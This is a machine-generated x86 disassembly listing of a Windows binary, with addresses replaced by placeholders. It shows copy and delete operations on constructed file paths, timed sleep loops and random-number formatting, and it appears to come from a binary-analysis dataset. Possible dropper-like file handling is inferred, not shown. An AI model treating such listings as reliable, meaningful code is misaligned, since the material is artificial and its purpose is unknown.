mov [ ebp - 0x6e8 ] eax
mov ecx [ ebp - 0x6e8 ]
push ecx
lea ecx [ ebp - 0x4a4 ]
call sub_410070
lea ecx [ ebp - 0x7b0 ]
call sub_401830
push 0x0
push 0x0
push 0xffffffff
lea ecx [ ebp - 0x48c ]
call sub_401870
push eax
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x6b0 ] eax
mov eax [ ebp - 0x6b0 ]
add eax 0x1
xor ecx ecx
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_421652
add esp 0x4
mov [ ebp - 0x6f8 ] eax
mov eax [ ebp - 0x6f8 ]
mov [ ebp - 0x6b8 ] eax
mov ecx [ ebp - 0x6b0 ]
add ecx 0x1
push ecx
push 0x0
mov edx [ ebp - 0x6b8 ]
push edx
call sub_427900
add esp 0xc
mov eax [ ebp - 0x6b0 ]
push eax
mov ecx [ ebp - 0x6b8 ]
push ecx
mov edx [ ebp - 0x6b0 ]
push edx
lea ecx [ ebp - 0x48c ]
call sub_401870
push eax
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
push 0x0
push 0x0
push 0xffffffff
lea ecx [ ebp - 0x4a4 ]
call sub_401870
push eax
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x6b0 ] eax
mov eax [ ebp - 0x6b0 ]
add eax 0x1
xor ecx ecx
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_421652
add esp 0x4
mov [ ebp - 0x700 ] eax
mov eax [ ebp - 0x700 ]
mov [ ebp - 0x6bc ] eax
mov ecx [ ebp - 0x6b0 ]
add ecx 0x1
push ecx
push 0x0
mov edx [ ebp - 0x6bc ]
push edx
call sub_427900
add esp 0xc
mov eax [ ebp - 0x6b0 ]
push eax
mov ecx [ ebp - 0x6bc ]
push ecx
mov edx [ ebp - 0x6b0 ]
push edx
lea ecx [ ebp - 0x4a4 ]
call sub_401870
push eax
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov eax [ ebp + 0xc ]
shl eax 0x1
push eax
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call sub_427900
add esp 0xc
mov edx [ ebp - 0x6b8 ]
push edx
mov eax [ ebp - 0x6bc ]
push eax
push r--data
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_42298e
add esp 0x14
mov eax [ ebp - 0x6bc ]
mov [ ebp - 0x6d4 ] eax
mov ecx [ ebp - 0x6d4 ]
push ecx
call j_sub_422732
add esp 0x4
cmp [ ebp - 0x6d4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x6c0 ]
mov cx [ eax ]
mov [ ebp - 0x6c6 ] cx
add [ ebp - 0x6c0 ] 0x2
cmp [ ebp - 0x6c6 ] 0x0
jne r-xdata
mov edx [ ebp - 0x6c0 ]
sub edx [ ebp - 0x6f4 ]
sar edx 0x1
mov [ ebp - 0x6e4 ] edx
mov eax [ ebp - 0x6e4 ]
push eax
push rw-data
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_424aa8
add esp 0x10
xor eax eax
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 2 - 0x2 ] ax
mov al 0x1
jmp r-xdata
mov edx [ ebp + 0xc ]
shl edx 0x1
push edx
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_427900
add esp 0xc
mov ecx [ ebp - 0x474 ]
push ecx
lea edx [ ebp - 0x470 ]
push edx
push r--data
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_42298e
add esp 0x14
mov [ ebp - 0x6b1 ] 0x1
mov [ ebp - 0x6f0 ] 0x208
mov eax [ ebp - 0x6f0 ]
push eax
lea ecx [ ebp - 0x470 ]
push ecx
call sub_420220
add esp 0x8
mov [ ebp - 0x6bc ] 0x8123
mov edx [ ebp - 0x6bc ]
mov [ ebp - 0x708 ] edx
mov [ ebp - 0x708 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x6c4 ]
mov dx [ ecx ]
mov [ ebp - 0x6c8 ] dx
add [ ebp - 0x6c4 ] 0x2
cmp [ ebp - 0x6c8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x6c4 ]
sub eax [ ebp - 0x704 ]
sar eax 0x1
mov [ ebp - 0x6ec ] eax
mov ecx [ ebp - 0x6ec ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
push 0x104
push rw-data
call sub_424aa8
add esp 0x10
mov eax 0x2
imul eax eax 0x103
mov [ ebp - 0x6d0 ] eax
cmp [ ebp - 0x6d0 ] 0x208
jae r-xdata
mov [ ebp - 0x6b8 ] 0x8123
mov edx [ ebp - 0x6b8 ]
mov [ ebp - 0x6d8 ] edx
mov [ ebp - 0x6d8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x6b8 ]
mov [ ebp - 0x6cc ] eax
mov ecx [ ebp - 0x6cc ]
push ecx
call j_sub_422732
add esp 0x4
cmp [ ebp - 0x6cc ] 0x0
jne r-xdata
call sub_424c9c
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x6c4 ] edx
mov eax [ ebp - 0x6c4 ]
add eax 0x2
mov [ ebp - 0x704 ] eax
mov [ ebp - 0x6b1 ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x4a4 ]
call sub_401830
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x48c ]
call sub_401830
jmp r-xdata
xor ecx ecx
mov edx [ ebp - 0x6d0 ]
mov [ edx + rw-data ] cx
mov al 0x1
sub_420960
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ r--data ]
push eax
push 0x0
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_4178d0
mov esp ebp
pop ebp
retn 0xc
sub_420990
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_401890
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_401ab0
push eax
mov ecx [ ebp - 0x4 ]
call sub_412440
mov esp ebp
pop ebp
retn 0x8
sub_4209c0
push ebp
mov ebp esp
sub esp 0x374
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov [ ebp - 0x1e8 ] 0x0
push r--data
lea ecx [ ebp - 0x1c8 ]
call sub_40bd80
push r--data
lea ecx [ ebp - 0x1e0 ]
call sub_40bd80
mov [ ebp - 0x1e1 ] 0x1
lea ecx [ ebp - 0x105 ]
call sub_401a30
push r--data
lea ecx [ ebp - 0x180 ]
call sub_40bd80
push r--data
lea ecx [ ebp - 0x198 ]
call sub_40bd80
push r--data
lea ecx [ ebp - 0x1b0 ]
call sub_40bd80
push 0x0
push r--data
mov eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0x374 ]
call sub_40bd80
mov ecx eax
call sub_40beb0
cmp eax [ r--data ]
je r-xdata
mov [ ebp - 0x1f0 ] 0x0
mov [ ebp - 0x1f0 ] 0x1
jmp r-xdata
lea ecx [ ebp - 0x180 ]
call sub_40be90
push eax
lea ecx [ ebp - 0x106 ]
call sub_41fa90
lea ecx [ ebp - 0x107 ]
call sub_40e880
lea ecx [ ebp - 0x107 ]
call sub_40ff70
lea ecx [ ebp - 0x107 ]
call sub_40cb60
push r--data
lea ecx [ ebp - 0x138 ]
call sub_40bd80
push r--data
lea ecx [ ebp - 0x120 ]
call sub_40bd80
push r--data
lea ecx [ ebp - 0x168 ]
call sub_40bd80
push r--data
lea ecx [ ebp - 0x150 ]
call sub_40bd80
mov [ ebp - 0x1ec ] 0x0
lea eax [ ebp - 0x150 ]
push eax
lea ecx [ ebp - 0x120 ]
push ecx
lea edx [ ebp - 0x168 ]
push edx
lea ecx [ ebp - 0x105 ]
call sub_41c8d0
movzx eax al
test eax eax
je r-xdata
mov cl [ ebp - 0x1f0 ]
mov [ ebp - 0x1ea ] cl
lea ecx [ ebp - 0x374 ]
call sub_40bdc0
movzx edx [ ebp - 0x1ea ]
test edx edx
je r-xdata
mov [ ebp - 0x208 ] 0x0
lea ecx [ ebp - 0x1b0 ]
call sub_40bdc0
lea ecx [ ebp - 0x198 ]
call sub_40bdc0
lea ecx [ ebp - 0x180 ]
call sub_40bdc0
lea ecx [ ebp - 0x105 ]
call sub_40cb60
lea ecx [ ebp - 0x1e0 ]
call sub_40bdc0
lea ecx [ ebp - 0x1c8 ]
call sub_40bdc0
mov eax [ ebp - 0x208 ]
push 0x400
call [ Sleep@IAT ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x120 ]
push eax
call sub_41e9c0
add esp 0x8
movzx ecx al
test ecx ecx
je r-xdata
push r--data
lea ecx [ ebp - 0x150 ]
push ecx
call sub_41e9c0
add esp 0x8
movzx edx al
test edx edx
je r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
lea eax [ ebp - 0x198 ]
push eax
lea ecx [ ebp - 0x120 ]
push ecx
lea edx [ ebp - 0x314 ]
push edx
call sub_4213c0
add esp 0xc
push eax
lea ecx [ ebp - 0x138 ]
call sub_410d50
lea ecx [ ebp - 0x314 ]
call sub_40bdc0
push 0x0
lea ecx [ ebp - 0x138 ]
call sub_40be90
push eax
lea eax [ ebp - 0x344 ]
push eax
lea ecx [ ebp - 0x105 ]
call sub_41c0e0
mov ecx eax
call sub_40be90
push eax
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x120 ]
push edx
lea ecx [ ebp - 0x105 ]
call sub_41c1b0
or [ ebp - 0x1e8 ] 0x2
push r--data
lea edx [ ebp - 0x120 ]
push edx
lea eax [ ebp - 0x2cc ]
push eax
call sub_421300
add esp 0xc
push eax
lea ecx [ ebp - 0x138 ]
call sub_410d50
mov [ ebp - 0x20c ] eax
or [ ebp - 0x1e8 ] 0x1
push r--data
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ ebp - 0x2fc ]
push ecx
call sub_421300
add esp 0xc
push eax
lea ecx [ ebp - 0x138 ]
call sub_410d50
mov [ ebp - 0x20c ] eax
jmp r-xdata
mov [ ebp - 0x1f8 ] 0x0
mov [ ebp - 0x1f8 ] 0x1
jmp r-xdata
mov edx [ ebp - 0x1e8 ]
and edx 0x1
je r-xdata
and [ ebp - 0x1e8 ] 0xfffffffd
lea ecx [ ebp - 0x2cc ]
call sub_40bdc0
mov ecx [ ebp - 0x1e8 ]
and ecx 0x2
je r-xdata
movzx eax [ ebp - 0x1e1 ]
test eax eax
je r-xdata
mov [ ebp - 0x1fc ] 0x1
lea ecx [ ebp - 0x150 ]
call sub_40bdc0
lea ecx [ ebp - 0x168 ]
call sub_40bdc0
lea ecx [ ebp - 0x120 ]
call sub_40bdc0
lea ecx [ ebp - 0x138 ]
call sub_40bdc0
lea ecx [ ebp - 0x1b0 ]
call sub_40bdc0
lea ecx [ ebp - 0x198 ]
call sub_40bdc0
lea ecx [ ebp - 0x180 ]
call sub_40bdc0
lea ecx [ ebp - 0x105 ]
call sub_40cb60
lea ecx [ ebp - 0x1e0 ]
call sub_40bdc0
lea ecx [ ebp - 0x1c8 ]
call sub_40bdc0
mov eax [ ebp - 0x1fc ]
jmp r-xdata
mov cl [ ebp - 0x1f8 ]
mov [ ebp - 0x1e9 ] cl
lea ecx [ ebp - 0x344 ]
call sub_40bdc0
movzx edx [ ebp - 0x1e9 ]
test edx edx
je r-xdata
lea eax [ ebp - 0x1c8 ]
push eax
lea ecx [ ebp - 0x105 ]
call sub_41ce30
mov esi eax
lea ecx [ ebp - 0x168 ]
push ecx
lea ecx [ ebp - 0x105 ]
call sub_41ce30
cmp esi eax
jg r-xdata
and [ ebp - 0x1e8 ] 0xfffffffe
lea ecx [ ebp - 0x2fc ]
call sub_40bdc0
lea ecx [ ebp - 0x1e0 ]
push ecx
lea edx [ ebp - 0x1b0 ]
push edx
lea eax [ ebp - 0x1c8 ]
push eax
lea ecx [ ebp - 0x120 ]
push ecx
lea ecx [ ebp - 0x105 ]
call sub_41c380
lea edx [ ebp - 0x180 ]
push edx
lea ecx [ ebp - 0x106 ]
call sub_41f720
movzx eax al
test eax eax
je r-xdata
push 0x0
call sub_41c080
add esp 0x4
push eax
call sub_4247a2
add esp 0x4
call sub_42477f
cdq
mov ecx 0xf4240
idiv ecx
mov [ ebp - 0x200 ] edx
xor edx edx
mov [ ebp - 0x104 ] dx
push 0xfe
push 0x0
lea eax [ ebp - 0x102 ]
push eax
call sub_427900
add esp 0xc
mov ecx [ ebp - 0x200 ]
push ecx
push r--data
lea edx [ ebp - 0x104 ]
push edx
call sub_421480
add esp 0xc
lea eax [ ebp - 0x104 ]
push eax
lea ecx [ ebp - 0x284 ]
call sub_40bd80
lea ecx [ ebp - 0x284 ]
push ecx
lea edx [ ebp - 0x180 ]
push edx
lea eax [ ebp - 0x138 ]
push eax
lea ecx [ ebp - 0x106 ]
call sub_41f5e0
movzx ecx al
test ecx ecx
jne r-xdata
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x10
movzx eax [ ebp - 0x1e1 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x138 ]
call sub_40be90
push eax
lea ecx [ ebp - 0x105 ]
call sub_41c170
movzx edx al
test edx edx
je r-xdata
mov [ ebp - 0x204 ] 0x1
lea ecx [ ebp - 0x150 ]
call sub_40bdc0
lea ecx [ ebp - 0x168 ]
call sub_40bdc0
lea ecx [ ebp - 0x120 ]
call sub_40bdc0
lea ecx [ ebp - 0x138 ]
call sub_40bdc0
lea ecx [ ebp - 0x1b0 ]
call sub_40bdc0
lea ecx [ ebp - 0x198 ]
call sub_40bdc0
lea ecx [ ebp - 0x180 ]
call sub_40bdc0
lea ecx [ ebp - 0x105 ]
call sub_40cb60
lea ecx [ ebp - 0x1e0 ]
call sub_40bdc0
lea ecx [ ebp - 0x1c8 ]
call sub_40bdc0
mov eax [ ebp - 0x204 ]
jmp r-xdata
lea ecx [ ebp - 0x150 ]
call sub_40bdc0
lea ecx [ ebp - 0x168 ]
call sub_40bdc0
lea ecx [ ebp - 0x120 ]
call sub_40bdc0
lea ecx [ ebp - 0x138 ]
call sub_40bdc0
jmp r-xdata
mov [ ebp - 0x1f4 ] 0x0
mov [ ebp - 0x1f4 ] 0x1
jmp r-xdata
push r--data
lea eax [ ebp - 0x150 ]
push eax
call sub_41e9c0
add esp 0x8
movzx ecx al
test ecx ecx
je r-xdata
push r--data
lea ecx [ ebp - 0x150 ]
push ecx
call sub_41e9c0
add esp 0x8
movzx edx al
test edx edx
je r-xdata
lea ecx [ ebp - 0x150 ]
call sub_40bdc0
lea ecx [ ebp - 0x168 ]
call sub_40bdc0
lea ecx [ ebp - 0x120 ]
call sub_40bdc0
lea ecx [ ebp - 0x138 ]
call sub_40bdc0
jmp r-xdata
lea ecx [ ebp - 0x150 ]
call sub_40bdc0
lea ecx [ ebp - 0x168 ]
call sub_40bdc0
lea ecx [ ebp - 0x120 ]
call sub_40bdc0
lea ecx [ ebp - 0x138 ]
call sub_40bdc0
jmp r-xdata
mov dl [ ebp - 0x1f4 ]
mov [ ebp - 0x1eb ] dl
lea ecx [ ebp - 0x284 ]
call sub_40bdc0
movzx eax [ ebp - 0x1eb ]
test eax eax
je r-xdata
push r--data
lea ecx [ ebp - 0x224 ]
call sub_40bd80
lea edx [ ebp - 0x224 ]
push edx
lea ecx [ ebp - 0x106 ]
call sub_41f7d0
lea ecx [ ebp - 0x224 ]
call sub_40bdc0
push r--data
lea ecx [ ebp - 0x29c ]
call sub_40bd80
lea eax [ ebp - 0x29c ]
push eax
lea ecx [ ebp - 0x106 ]
call sub_41f7d0
lea ecx [ ebp - 0x29c ]
call sub_40bdc0
push r--data
lea ecx [ ebp - 0x2b4 ]
call sub_40bd80
lea ecx [ ebp - 0x2b4 ]
push ecx
lea ecx [ ebp - 0x106 ]
call sub_41f7d0
lea ecx [ ebp - 0x2b4 ]
call sub_40bdc0
push 0xea60
call [ Sleep@IAT ]
movzx edx [ ebp - 0x1e1 ]
test edx edx
je r-xdata
push r--data
lea ecx [ ebp - 0x180 ]
call sub_40bde0
push r--data
lea ecx [ ebp - 0x198 ]
call sub_40bde0
push r--data
lea ecx [ ebp - 0x1b0 ]
call sub_40bde0
jmp r-xdata
push r--data
lea ecx [ ebp - 0x180 ]
call sub_40bde0
push r--data
lea ecx [ ebp - 0x198 ]
call sub_40bde0
push r--data
lea ecx [ ebp - 0x1b0 ]
call sub_40bde0
push r--data
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ ebp - 0x35c ]
push ecx
call sub_421300
add esp 0xc
mov ecx eax
call sub_40be90
push eax
call [ DeleteFileW@IAT ]
lea ecx [ ebp - 0x35c ]
call sub_40bdc0
push r--data
lea edx [ ebp - 0x120 ]
push edx
lea eax [ ebp - 0x32c ]
push eax
call sub_421300
add esp 0xc
mov ecx eax
call sub_40be90
push eax
call [ DeleteFileW@IAT ]
lea ecx [ ebp - 0x32c ]
call sub_40bdc0
push r--data
lea ecx [ ebp - 0x120 ]
push ecx
lea edx [ ebp - 0x2e4 ]
push edx
call sub_421300
add esp 0xc
mov ecx eax
call sub_40be90
push eax
call [ DeleteFileW@IAT ]
lea ecx [ ebp - 0x2e4 ]
call sub_40bdc0
push r--data
lea ecx [ ebp - 0x26c ]
call sub_40bd80
lea eax [ ebp - 0x26c ]
push eax
lea ecx [ ebp - 0x106 ]
call sub_41f860
lea ecx [ ebp - 0x26c ]
call sub_40bdc0
push r--data
lea ecx [ ebp - 0x23c ]
call sub_40bd80
lea ecx [ ebp - 0x23c ]
push ecx
lea ecx [ ebp - 0x106 ]
call sub_41f860
lea ecx [ ebp - 0x23c ]
call sub_40bdc0
push r--data
lea ecx [ ebp - 0x254 ]
call sub_40bd80
lea edx [ ebp - 0x254 ]
push edx
lea ecx [ ebp - 0x106 ]
call sub_41f860
lea ecx [ ebp - 0x254 ]
call sub_40bdc0
push 0xea60
call [ Sleep@IAT ]
sub_421191
jmp r-xdata
lea ecx [ ebp - 0x150 ]
call sub_40bdc0
lea ecx [ ebp - 0x168 ]
call sub_40bdc0
lea ecx [ ebp - 0x120 ]
call sub_40bdc0
lea ecx [ ebp - 0x138 ]
call sub_40bdc0
jmp r-xdata
mov ecx 0x1
test ecx ecx
je r-xdata
mov [ ebp - 0x208 ] 0x0
lea ecx [ ebp - 0x1b0 ]
call sub_40bdc0
lea ecx [ ebp - 0x198 ]
call sub_40bdc0
lea ecx [ ebp - 0x180 ]
call sub_40bdc0
lea ecx [ ebp - 0x105 ]
call sub_40cb60
lea ecx [ ebp - 0x1e0 ]
call sub_40bdc0
lea ecx [ ebp - 0x1c8 ]
call sub_40bdc0
mov eax [ ebp - 0x208 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x10
push 0x400
call [ Sleep@IAT ]
jmp r-xdata
sub_421300
push ebp
mov ebp esp
push 0xffffffff
push sub_43c3a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x2c ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_40bd50
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_401890
mov esi eax
mov eax [ ebp + 0x10 ]
push eax
call sub_40bc30
add esp 0x4
add esi eax
push esi
lea ecx [ ebp - 0x28 ]
call sub_41ebf0
mov ecx [ ebp + 0xc ]
push ecx
lea ecx [ ebp - 0x28 ]
call sub_41e920
mov edx [ ebp + 0x10 ]
push edx
lea ecx [ ebp - 0x28 ]
call sub_41eba0
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_41a2d0
mov ecx [ ebp - 0x2c ]
or ecx 0x1
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_40bdc0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_4213c0
push ebp
mov ebp esp
push 0xffffffff
push sub_43c3a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x2c ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_40bd50
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_401890
mov esi eax
mov ecx [ ebp + 0x10 ]
call sub_401890
add esi eax
push esi
lea ecx [ ebp - 0x28 ]
call sub_41ebf0
mov eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_41e920
mov ecx [ ebp + 0x10 ]
push ecx
lea ecx [ ebp - 0x28 ]
call sub_41e920
lea edx [ ebp - 0x28 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_41a2d0
mov eax [ ebp - 0x2c ]
or eax 0x1
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x28 ]
call sub_40bdc0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_421480
push ebp
mov ebp esp
sub esp 0x8
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_424d76
add esp 0xc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_4214b1
push ebp
mov ebp esp
cmp [ r--data ] 0x0
mov eax r--data
je r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
pop ebp
retn
add eax 0x8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_4214db
push ebp
mov ebp esp
cmp [ r--data ] 0x0
mov eax r--data
je r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
pop ebp
retn
add eax 0x8
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] ecx
je r-xdata
sub_421581
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_423991
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_422732#2
pop ecx
sub_4215a6
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_423991
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_422732#2
pop ecx
sub_4215c5
push ebp
mov ebp esp
sub esp 0x10
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_423953
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_42569b
int3
sub_4215f6
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_42392e
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_42569b
int3
sub_421624
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_42392e
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_42569b
int3
sub_42165b
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_421e4d
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_42168a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] eax
test eax eax
jne r-xdata
cmp eax 0x4
jge r-xdata
push 0xc
call sub_425b56
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
imul eax eax 0x18
add eax rw-data
push eax
call sub_421e64
pop ecx
sub_4216bd
push rw-data
call [ InterlockedDecrement@IAT ]
test eax eax
jns r-xdata
retn
push esi
mov esi rw-data
push esi
call sub_421e3f
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_4216e6
mov eax [ ecx ]
test eax eax
jne r-xdata
cmp eax 0x4
jge r-xdata
push 0xc
call sub_425cba
pop ecx
retn
retn
imul eax eax 0x18
add eax rw-data
push eax
call sub_421e72
pop ecx
sub_42170a
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
push esi
mov esi ecx
xor edx edx
lea ecx [ esi + 0x18 ]
mov [ esi + 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] edx
mov [ esi + 0x10 ] edx
mov [ esi + 0x14 ] al
push r--data
mov [ ecx ] edx
mov [ ecx + 0x4 ] dl
call sub_4217ab
mov eax esi
pop esi
pop ebp
retn 0x4
sub_42175c
push esi
jmp r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
mov eax [ esi ]
mov ecx esi
mov [ rw-data ] eax
call sub_421747
push esi
call j_sub_422732#2
pop ecx
pop esi
retn
sub_421780
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_4218c8
cmp [ esi + 0x18 ] 0x0
pop ecx
je r-xdata
and [ esi + 0x18 ] 0x0
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x18 ]
call sub_422732
pop ecx
sub_4217ab
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
cmp [ ebx ] edi
je r-xdata
pop edi
mov eax ebx
pop ebx
pop ebp
retn 0x4
cmp [ ebx ] 0x0
je r-xdata
and [ ebx ] 0x0
test edi edi
je r-xdata
push [ ebx ]
call sub_422732
pop ecx
cmp [ edi ] 0x0
push esi
mov esi edi
je r-xdata
sub esi edi
inc esi
push esi
call sub_42276a
pop ecx
mov [ ebx ] eax
test eax eax
je r-xdata
inc esi
cmp [ esi ] 0x0
jne r-xdata
pop esi
push esi
push edi
push eax
call sub_424fc0
add esp 0xc
sub_4217ff
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_421780
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_422732#2
pop ecx
sub_42181e
push ebp
mov ebp esp
push 0x8
call sub_42257f
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_42184c
push 0x4
mov eax sub_43afa8
call sub_42570a
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_42168a
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push esi
call sub_421986
mov esi eax
push esi
call sub_4219a5
pop ecx
pop ecx
push r--data
lea ecx [ esi + 0x18 ]
mov [ esi + 0x10 ] 0x3f
call sub_4217ab
mov [ rw-data ] esi
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
mov eax [ rw-data ]
mov [ rw-data ] eax
lea ecx [ ebp - 0x10 ]
call sub_4216e6
mov eax esi
call sub_4256f6
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
sub_4218c8
push 0x4
mov eax sub_43afa8
call sub_42570a
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_42168a
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x8 ]
dec esi
mov ecx [ eax + esi * 4 ]
test ecx ecx
je r-xdata
push [ edi + 0x8 ]
call sub_422732
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_4216e6
call sub_4256f6
retn
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_421921
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_425ccf
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x24 ]
call sub_4217ab
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
